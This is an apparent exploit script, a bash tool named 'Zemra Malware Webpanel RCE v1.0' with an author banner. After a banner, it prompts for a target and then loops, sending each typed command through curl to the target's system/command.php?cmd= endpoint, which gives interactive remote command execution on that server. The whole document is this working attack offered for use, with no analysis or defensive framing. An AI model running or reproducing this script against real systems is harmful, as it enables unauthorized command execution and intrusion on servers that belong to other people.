clear
echo "**********************************"
echo "*                                *"
echo "*                                *"
echo "*     Zemra Malware Webpanel     *"
echo "*            RCE v1.0            *"
echo "*                                *"
echo "*        Author : 4nyb0dy        *"
echo "*                                *"
echo "*        Greetz : 0x00fy         *"
echo "*                                *"
echo "**********************************"

echo -n "Target : "
read hedef

while true
do
echo -n "[4nyb0dy@malwr.cc]~$ "
read komut
curl $hedef/system/command.php?cmd=$komut
done
